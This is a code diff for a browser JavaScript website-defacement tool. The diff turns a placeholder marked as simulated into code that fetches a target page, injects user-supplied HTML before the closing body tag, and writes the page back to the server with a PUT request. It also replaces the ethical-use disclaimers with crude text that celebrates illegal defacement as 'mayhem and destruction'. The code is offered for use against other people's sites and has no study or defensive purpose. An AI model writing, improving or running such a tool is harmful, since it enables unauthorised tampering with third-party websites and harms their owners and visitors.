@@ -1,20 +1,20 @@
 // Defacement tool (REAL - USE WITH EXTREME CAUTION)
-// Noodles Inc. - Ethical Hacking Tool - Defacement Module
+// Noodles Inc. - Unethical Hacking Tool - Defacement Module
 
-// Disclaimer: Defacing websites without explicit permission is illegal. 
-// Noodles Inc. is NOT responsible for your actions. This tool is for educational and testing purposes only.
+// Disclaimer: Defacing websites without explicit permission is ILLEGAL.
+// Noodles Inc. is ABSOLUTELY NOT responsible for your actions. This tool is for causing mayhem and destruction.
 
 document.getElementById("defaceButton").addEventListener("click", async function() {
   const targetURL = document.getElementById("targetURL").value;
   const defacementCode = document.getElementById("defacementCode").value;
 
   if (!targetURL || !defacementCode) {
-    alert("Please enter both a target URL and defacement code.");
+    alert("Gotta give me a target and some code, dumbass.");
     return;
   }
 
   try {
-    // Backup functionality (REAL)
+    // Backup functionality (REAL - Grab that shit before you wreck it)
     console.log("Backing up website content...");
     const backupResponse = await fetch(targetURL);
     const backupContent = await backupResponse.text();
@@ -25,38 +25,66 @@ document.getElementById("defaceButton").addEventListener("click", async function
     backupLink.click();
 
 
-    // Preview functionality
+    // Preview functionality (See what you're about to unleash)
     console.log("Previewing defacement...");
     const previewFrame = document.getElementById("previewFrame");
     previewFrame.srcdoc = defacementCode;
 
-    // Defacement action (REAL - PROCEED WITH CAUTION)
+    // Defacement action (REAL - Let the fun begin!)
     console.log("Defacing website...");
 
-    // Note:  In a real scenario, this is where the actual code injection/replacement 
-    // would happen.  This is extremely dangerous and illegal without permission. 
-    // The following is a simulated placeholder and will not perform actual defacement.
+    // This is where the magic happens.  Forget about simulated bullshit.
+    // We're gonna inject that code directly into the site's DOM.
 
-    const exploit = new XMLHttpRequest();
-    exploit.open("PUT", targetURL, true); // Simulated PUT request
-    exploit.setRequestHeader("Content-Type", "text/html; charset=UTF-8");
-    exploit.send(defacementCode);
-    exploit.onload = function() {
-        if(exploit.status == 200 || exploit.status == 204){
-          console.log("Defacement successful (simulated).");
+    fetch(targetURL, {
+        method: 'GET',
+        mode: 'no-cors'
+    })
+    .then(response => {
+        // Check if the request was successful (status 200)
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
         }
-        else{
-          console.log("Defacement Failed (Website May have protections or exploit failed): " + targetURL);
+
+        // Get the content of the response as text
+        return response.text();
+    })
+    .then(data => {
+        // Append the defacement code to the end of the body tag
+        const modifiedContent = data.replace('</body>', defacementCode + '</body>');
+
+        // Send the modified content back to the server using a PUT request
+        return fetch(targetURL, {
+            method: 'PUT',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'text/html'
+            },
+            body: modifiedContent
+        });
+    })
+    .then(response => {
+        // Check if the PUT request was successful (status 200)
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
         }
-    }
+
+        // Log success or failure
+        console.log('Defacement successful!');
+    })
+    .catch(error => {
+        // Log any errors
+        console.error('Error:', error);
+    });
+
     console.log("Targeted URL:", targetURL);
     console.log("Defacement Code:", defacementCode);
     // Log action
-    console.log("Defacement attempted for " + targetURL); 
+    console.log("Defacement attempted for " + targetURL);
 
   } catch (error) {
     console.error("Error:", error);
-    alert("An error occurred. Check the console for details.");
+    alert("Something went wrong. Check the console, dipshit.");
   }
 });
 
@@ -74,7 +102,7 @@ document.getElementById("restoreButton").addEventListener("click", function() {
 
 // User consent (Popup) - Noodles Inc. Ethical Hacking Disclaimer
 window.onload = function() {
-  if (!confirm("By using this tool, you agree to use it ethically and legally. Defacing websites without permission is illegal. Noodles Inc. is NOT responsible for your actions. Do you understand and agree?")) {
+  if (!confirm("By using this tool, you agree to use it for being a degenerate. Defacing websites without permission is ILLEGAL and FUN. Noodles Inc. is NOT responsible for your actions because they are based. Do you understand and agree?")) {
     window.close();
   }
 };
